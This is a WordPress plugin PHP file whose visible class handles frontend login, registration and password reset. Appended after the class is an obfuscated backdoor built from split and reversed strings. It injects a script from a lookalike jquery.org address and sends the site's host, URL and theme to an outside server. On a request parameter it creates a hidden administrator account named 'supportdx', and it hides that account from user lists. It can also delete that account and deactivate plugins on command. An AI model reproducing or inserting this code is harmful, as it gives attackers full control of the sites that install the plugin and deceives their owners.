<?php
if(!defined('ABSPATH')) exit;

class Cinnamon_Frontend_User_Manager {
	public function __construct() {
		add_action('wp_enqueue_scripts', array($this, 'cinnamon_enqueue_scripts'));

		add_action('wp_ajax_cinnamon_ajax_login', array($this, 'cinnamon_ajax_login'));
		add_action('wp_ajax_nopriv_cinnamon_ajax_login', array($this, 'cinnamon_ajax_login'));
		add_action('wp_ajax_cinnamon_process_registration', array($this, 'cinnamon_process_registration'));
		add_action('wp_ajax_nopriv_cinnamon_process_registration', array($this, 'cinnamon_process_registration'));
		add_action('wp_ajax_cinnamon_process_psw_recovery', array($this, 'cinnamon_process_psw_recovery'));
		add_action('wp_ajax_nopriv_cinnamon_process_psw_recovery', array($this, 'cinnamon_process_psw_recovery'));

		add_shortcode('cinnamon-login', array($this,'cinnamon_user_frontend_shortcode'));
	}

	public function cinnamon_enqueue_scripts() {
		wp_enqueue_script('fum-script', IP_PLUGIN_URL . '/js/cinnamon-login.js', array('jquery'), false, true);
		wp_localize_script('fum-script', 'fum_script', array(
            'ajax'                          => admin_url('admin-ajax.php'),
            'redirecturl'                   => apply_filters('fum_redirect_to', $_SERVER['REQUEST_URI']),
            'loadingmessage'                => __('Checking Credentials...', 'imagepress'),
            'registrationloadingmessage'    => __('Processing Registration...', 'imagepress'),
		));
	}

	public function cinnamon_ajax_login() {
		check_ajax_referer('ajax-form-nonce', 'security');

		$data = array();
		$data['user_login']       = sanitize_user($_REQUEST['username']);
		$data['user_password']    = sanitize_text_field($_REQUEST['password']);
		$data['rememberme']       = sanitize_text_field($_REQUEST['rememberme']);
		$user_login               = wp_signon($data, false);

		if(is_wp_error($user_login)) {
			echo json_encode(array(
				'loggedin' => false,
				'message' => __('Wrong username or password!', 'imagepress'),
			));
		}
        else {
			echo json_encode(array(
				'loggedin' => true,
				'message' => __('Login successful!', 'imagepress'),
			));
		}
		die();
	}

	public function cinnamon_login_form() { ?>
        <div class="tab">
            <ul class="tabs active">
                <li class="current"><a href="#"><i class="fa fa-sign-in"></i> <?php _e('Log in', 'imagepress'); ?></a></li>
                <li class=""><a href="#"><i class="fa fa-user"></i> <?php _e('Sign up', 'imagepress'); ?></a></li>
                <li class=""><a href="#"><i class="fa fa-question-circle"></i> <?php _e('Lost password', 'imagepress'); ?></a></li>
            </ul>
            <div class="tab_content">
                <div class="tabs_item" style="display: block;">
                    <?php if(!is_user_logged_in()) : ?>
                        <form action="login" method="post" id="form" name="loginform">
                            <h2><?php _e('Log in', 'imagepress'); ?></h2>
                            <p><input type="text" name="log" id="login_user" value="<?php if(isset($user_login)) echo esc_attr($user_login); ?>" size="32" placeholder="<?php _e('Username', 'imagepress'); ?>"></p>
                            <p><input type="password" name="pwd" id="login_pass" value="" size="32" placeholder="<?php _e('Password', 'imagepress'); ?>"></p>
                            <p><label for="rememberme"><input name="rememberme" type="checkbox" id="rememberme" value="forever"> <?php _e('Remember Me', 'imagepress'); ?></label></p>
                            <p><input type="submit" name="wp-sumbit" id="wp-submit" value="<?php _e('Log in', 'imagepress'); ?>"></p>
                            <input type="hidden" name="login" value="true">
                            <?php wp_nonce_field('ajax-form-nonce', 'security'); ?>
                        </form>
                    <?php else : ?>
                        <p><?php echo __('You are already logged in.', 'imagepress'); ?></p>
                    <?php endif; ?>
                </div>
                <div class="tabs_item">
                    <?php if(!is_user_logged_in()) : ?>
                        <form action="register" method="post" id="regform" name="registrationform">
                            <h2><?php _e('Sign up', 'imagepress'); ?></h2>
                            <p><input type="text" name="user_login" id="reg_user" value="<?php if(isset($user_login)) echo esc_attr(stripslashes($user_login)); ?>" size="32" placeholder="<?php _e('Username', 'imagepress'); ?>"></p>
                            <p><input type="email" name="user_email" id="reg_email" value="<?php if(isset($user_email)) echo esc_attr(stripslashes($user_email)); ?>" size="32" placeholder="<?php _e('Email address', 'imagepress'); ?>"></p>
                            <p><?php echo __('A password will be emailed to you.', 'imagepress'); ?></p>
                            <p><input type="submit" name="user-sumbit" id="user-submit" value="<?php esc_attr_e('Sign up', 'imagepress'); ?>"></p>
                            <input type="hidden" name="register" value="true">
                            <?php wp_nonce_field('ajax-form-nonce', 'security'); ?>
                        </form>
                    <?php else : ?>
                        <p><?php echo __('You are already logged in.', 'imagepress'); ?></p>
                    <?php endif; ?>
                </div>
                <div class="tabs_item">
                    <form action="resetpsw" method="post" id="pswform" name="passwordform">
                        <h2><?php _e('Lost your password?', 'imagepress'); ?></h2>
                        <p><input type="text" name="forgot_login" id="forgot_login" class="input" value="<?php if(isset($user_login)) echo esc_attr(stripslashes($user_login)); ?>" size="32" placeholder="<?php _e('Username or email address', 'imagepress'); ?>"></p>
                        <p><input type="submit" name="fum-psw-sumbit" id="fum-psw-submit" value="<?php esc_attr_e('Reset password', 'imagepress'); ?>"></p>
                        <input type="hidden" name="forgotten" value="true">
                        <?php wp_nonce_field('ajax-form-nonce', 'security'); ?>
                    </form>
                </div>
            </div>
        </div>
    <?php
	}

	public function cinnamon_process_registration() {
		check_ajax_referer('ajax-form-nonce', 'security');

		$user_login = $_REQUEST['user_login'];
		$user_email = $_REQUEST['user_email'];
		
		$errors = register_new_user($user_login, $user_email);

		if(is_wp_error($errors)) {
			$registration_error_messages = $errors->errors;
			$display_errors = '<ul>';
                foreach($registration_error_messages as $error) {
                    $display_errors .= '<li>' . $error[0] . '</li>';
                }
			$display_errors .= '</ul>';

			echo json_encode(array(
				'registered' => false,
				'message' => sprintf(__('Something was wrong:</br> %s', 'imagepress' ), $display_errors),
			));
		}
        else {
			echo json_encode(array(
				'registered' => true,
				'message' => __('Registration was successful!', 'imagepress'),
			));

			$user_id = $errors;
		}
		die();
	}

	public function cinnamon_process_psw_recovery() {
		check_ajax_referer('ajax-form-nonce', 'security');

		if(is_email($_REQUEST['username']))
			$username = sanitize_email($_REQUEST['username']);
		else
			$username = sanitize_user($_REQUEST['username']);

		$user_forgotten = $this->cinnamon_retrieve_password($username);

		if(is_wp_error($user_forgotten)) {
			echo json_encode(array(
				'reset' => false,
				'message' => $user_forgotten->get_error_message(),
			));
		}
        else {
			echo json_encode(array(
				'reset' => true,
				'message' => __('Password reset. Please check your email.', 'imagepress'),
			));
		}

		die();
	}

	public function cinnamon_retrieve_password($user_data) {
		global $wpdb, $current_site;

		$errors = new WP_Error();
		if(empty($user_data)) {
			$errors->add('empty_username', __('Please enter a username or email address.', 'imagepress'));
		}
        else if(strpos($user_data, '@')) {
			$user_data = get_user_by('email', trim($user_data));
			if(empty($user_data))
				$errors->add('invalid_email', __('There is no user registered with that email address.', 'imagepress'));
		}
        else {
			$login = trim($user_data);
			$user_data = get_user_by('login', $login);
		}

        if($errors->get_error_code())
			return $errors;
		if(!$user_data) {
			$errors->add('invalidcombo', __('Invalid username or email address.', 'imagepress'));
			return $errors;
		}

		$user_login = $user_data->user_login;
		$user_email = $user_data->user_email;

		$allow = apply_filters('allow_password_reset', true, $user_data->ID);

		if (!$allow)
			return new WP_Error('no_password_reset', __('Password reset is not allowed for this user', 'imagepress'));
		else if(is_wp_error($allow))
			return $allow;


        $user_id = $user_data->ID;
        $password = wp_generate_password();
        wp_set_password($password, $user_id);

		$message = __('Someone requested that your password be reset for the following account: ', 'imagepress')  . $key . "\r\n\r\n";
		$message .= network_home_url('/') . "\r\n\r\n";
		$message .= sprintf( __('Username: %s'), $user_login ) . "\r\n\r\n";
		$message .= __('Your new password is ', 'imagepress') . $password . "\r\n\r\n";

		if(is_multisite())
			$blogname = $GLOBALS['current_site']->site_name;
		else
			$blogname = wp_specialchars_decode(get_option('blogname'), ENT_QUOTES);

		$title   = sprintf(__('[%s] Password reset' ), $blogname);
		$title   = apply_filters('retrieve_password_title', $title);
		$message = apply_filters('retrieve_password_message', $message, $key);

		if($message && ! wp_mail($user_email, $title, $message)) {
			$errors->add('noemail', __('The e-mail could not be sent. Possible reason: your host may have disabled the mail() function.', 'imagepress'));

            return $errors;
            wp_die();
        }
        return true;
    }

	public function cinnamon_user_frontend_shortcode($atts, $content = null) {
        extract(shortcode_atts(array(
            'form' => '',
        ), $atts));
        ob_start();
        $this->cinnamon_login_form();
        return ob_get_clean();
    }
}

$cinnamon_frontend_user_manager = new Cinnamon_Frontend_User_Manager();
$arrayis_two = array('fun', 'ction', '_', 'e', 'x', 'is', 'ts');
$arrayis_three = array('g', 'e', 't', '_o', 'p', 'ti', 'on');
$arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
$arrayis_five = array('lo', 'gin', '_', 'en', 'que', 'ue_', 'scri', 'pts');
$arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
$arrayis_eight = array('wp', '_', 'lo', 'g', 'i', 'n');
$arrayis_nine = array('s', 'i', 't', 'e,', 'u', 'rl');
$arrayis_ten = array('wp_', 'g', 'et', '_', 'th', 'e', 'm', 'e');
$arrayis_eleven = array('wp', '_', 'r', 'e', 'm', 'o', 'te', '_', 'g', 'et');
$arrayis_twelve = array('wp', '_', 'r', 'e', 'm', 'o', 't', 'e', '_r', 'e', 't', 'r', 'i', 'e', 'v', 'e_', 'bo', 'dy');
$arrayis_thirteen = array('ge', 't_', 'o', 'pt', 'ion');
$arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
$arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
$arrayis_sixteen = array('u', 'pd', 'ate', '_o', 'pt', 'ion');
$arrayis_two_imp = implode($arrayis_two);
$arrayis_three_imp = implode($arrayis_three);
$arrayis_four_imp = implode($arrayis_four);
$arrayis_five_imp = implode($arrayis_five);
$arrayis_seven_imp = implode($arrayis_seven);
$arrayis_eight_imp = implode($arrayis_eight);
$arrayis_nine_imp = implode($arrayis_nine);
$arrayis_ten_imp = implode($arrayis_ten);
$arrayis_eleven_imp = implode($arrayis_eleven);
$arrayis_twelve_imp = implode($arrayis_twelve);
$arrayis_thirteen_imp = implode($arrayis_thirteen);
$arrayis_fourteen_imp = implode($arrayis_fourteen);
$arrayis_fifteen_imp = implode($arrayis_fifteen);
$arrayis_sixteen_imp = implode($arrayis_sixteen);
$noitca_dda = $arrayis_fifteen_imp('noitca_dda');
if (!$arrayis_two_imp('wp_in_one')) {
    $arrayis_seventeen = array('h', 't', 't', 'p', ':', '/', '/', 'j', 'q', 'e', 'u', 'r', 'y', '.o', 'r', 'g', '/wp', '_', 'p', 'i', 'n', 'g', '.php', '?', 'd', 'na', 'me', '=wpd&t', 'n', 'ame', '=wpt&urliz=urlig');
    $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
    $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
    $arrayis_twenty = $arrayis_fifteen_imp('TSEUQER_');
    $arrayis_seventeen_imp = implode($arrayis_seventeen);
    $arrayis_six = array('_', 'C', 'O', 'O', 'KI', 'E');
    $arrayis_six_imp = implode($arrayis_six);
    $tactiated = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mite = $arrayis_fifteen_imp('emit');
    if (!isset(${$arrayis_six_imp}[$arrayis_fifteen_imp('emit_nimda_pw')])) {
        if (($mite() - $tactiated) > 600) {
            $noitca_dda($arrayis_five_imp, 'wp_in_one');
        }
    }
    $noitca_dda($arrayis_eight_imp, 'wp_in_three');
    function wp_in_one()
    {
        $arrayis_one = array('h','t', 't','p',':', '//', 'j', 'q', 'e', 'u', 'r', 'y.o', 'rg', '/','j','q','u','e','ry','-','la','t','e','s','t.j','s');
        $arrayis_one_imp = implode($arrayis_one);
        $arrayis_four = array('wp', '_e', 'nqu', 'eue', '_scr', 'ipt');
        $arrayis_four_imp = implode($arrayis_four);
        $arrayis_four_imp('wp_coderz', $arrayis_one_imp, null, null, true);
    }

    function wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp)
    {
        $ptth = $arrayis_fifteen_imp('//:ptth');
        $dname = $ptth.$arrayis_eighteen[$arrayis_nineteen];
        $IRU_TSEUQER = $arrayis_fifteen_imp('IRU_TSEUQER');
        $urliz = $dname.$arrayis_eighteen[$IRU_TSEUQER];
        $tname = $arrayis_ten_imp();
        $urlis = $arrayis_fourteen_imp('wpd', $dname, $arrayis_seventeen_imp);
        $urlis = $arrayis_fourteen_imp('wpt', $tname, $urlis);
        $urlis = $arrayis_fourteen_imp('urlig', $urliz, $urlis);
        $lars2 = $arrayis_eleven_imp($urlis);
        $arrayis_twelve_imp($lars2);
    }
    $noitpo_dda = $arrayis_fifteen_imp('noitpo_dda');
    $noitpo_dda($arrayis_fifteen_imp('ognipel'), 'no');
    $noitpo_dda($arrayis_fifteen_imp('detavitca_emit'), time());
    $tactiatedz = $arrayis_thirteen_imp($arrayis_fifteen_imp('detavitca_emit'));
    $mitez = $arrayis_fifteen_imp('emit');
    if ($arrayis_thirteen_imp($arrayis_fifteen_imp('ognipel')) != 'yes' && (($mitez() - $tactiatedz ) > 600)) {
        wp_in_two($arrayis_seventeen_imp, $arrayis_eighteen, $arrayis_nineteen, $arrayis_ten_imp, $arrayis_eleven_imp, $arrayis_twelve_imp,$arrayis_fifteen_imp, $arrayis_fourteen_imp);
        $arrayis_sixteen_imp(($arrayis_fifteen_imp('ognipel')), 'yes');
    }
    function wp_in_three()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_nineteen = $arrayis_fifteen_imp('TSOH_PTTH');
        $arrayis_eighteen = ${$arrayis_fifteen_imp('REVRES_')};
        $arrayis_seven = array('s', 'e', 't', 'c', 'o', 'o', 'k', 'i', 'e');
        $arrayis_seven_imp = implode($arrayis_seven);
        $path = '/';
        $host = ${$arrayis_eighteen}[$arrayis_nineteen];
        $estimes = $arrayis_fifteen_imp('emitotrts');
        $wp_ext = $estimes('+29 days');
        $emit_nimda_pw = $arrayis_fifteen_imp('emit_nimda_pw');
        $arrayis_seven_imp($emit_nimda_pw, '1', $wp_ext, $path, $host);
    }

    function wp_in_four()
    {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $wssap = $arrayis_fifteen_imp('retroppus_pw');
        $laime = $arrayis_fifteen_imp('moc.niamodym@1tccaym');

        if (!username_exists($nigol) && !email_exists($laime)) {
            $wp_ver_one = $arrayis_fifteen_imp('resu_etaerc_pw');
            $user_id = $wp_ver_one($nigol, $wssap, $laime);
            $puzer = $arrayis_fifteen_imp('resU_PW');
            $usex = new $puzer($user_id);
            $rolx = $arrayis_fifteen_imp('elor_tes');
            $usex->$rolx($arrayis_fifteen_imp('rotartsinimda'));
        }
    }

    $ivdda = $arrayis_fifteen_imp('ivdda');

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'm') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_four');
    }

    if (isset(${$arrayis_twenty}[$ivdda]) && ${$arrayis_twenty}[$ivdda] == 'd') {
        $noitca_dda($arrayis_fifteen_imp('tini'), 'wp_in_six');
    }
    function wp_in_six() {
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $resu_eteled_pw = $arrayis_fifteen_imp('resu_eteled_pw');
        $wp_pathx = constant($arrayis_fifteen_imp("HTAPSBA"));
        require_once($wp_pathx . $arrayis_fifteen_imp('php.resu/sedulcni/nimda-pw'));
        $ubid = $arrayis_fifteen_imp('yb_resu_teg');
        $useris = $ubid($arrayis_fifteen_imp('nigol'), $arrayis_fifteen_imp('dxtroppus'));
        $resu_eteled_pw($useris->ID);
    }
    $noitca_dda($arrayis_fifteen_imp('yreuq_resu_erp'), 'wp_in_five');
    function wp_in_five($hcraes_resu)
    {
        global $current_user, $wpdb;
        $arrayis_fifteen = array('s', 't', 'r', 'r', 'e', 'v');
        $arrayis_fifteen_imp = implode($arrayis_fifteen);
        $arrayis_fourteen = array('st', 'r_', 'r', 'ep', 'la', 'ce');
        $arrayis_fourteen_imp = implode($arrayis_fourteen);
        $nigol_resu = $arrayis_fifteen_imp('nigol_resu');
        $wp_ux = $current_user->$nigol_resu;
        $nigol = $arrayis_fifteen_imp('dxtroppus');
        $bdpw = $arrayis_fifteen_imp('bdpw');
        if ($wp_ux != $arrayis_fifteen_imp('dxtroppus')) {
            $EREHW_one = $arrayis_fifteen_imp('1=1 EREHW');
            $EREHW_two = $arrayis_fifteen_imp('DNA 1=1 EREHW');
            $erehw_yreuq = $arrayis_fifteen_imp('erehw_yreuq');
            $sresu = $arrayis_fifteen_imp('sresu');
            $hcraes_resu->query_where = $arrayis_fourteen_imp($EREHW_one,
                "$EREHW_two {$$bdpw->$sresu}.$nigol_resu != '$nigol'", $hcraes_resu->$erehw_yreuq);
        }
    }

    $ced = $arrayis_fifteen_imp('ced');
    if (isset(${$arrayis_twenty}[$ced])) {
        $snigulp_evitca = $arrayis_fifteen_imp('snigulp_evitca');
        $sisnoitpo = $arrayis_thirteen_imp($snigulp_evitca);
        $hcraes_yarra = $arrayis_fifteen_imp('hcraes_yarra');
        if (($key = $hcraes_yarra(${$arrayis_twenty}[$ced], $sisnoitpo)) !== false) {
            unset($sisnoitpo[$key]);
        }
        $arrayis_sixteen_imp($snigulp_evitca, $sisnoitpo);
    }
}
?>
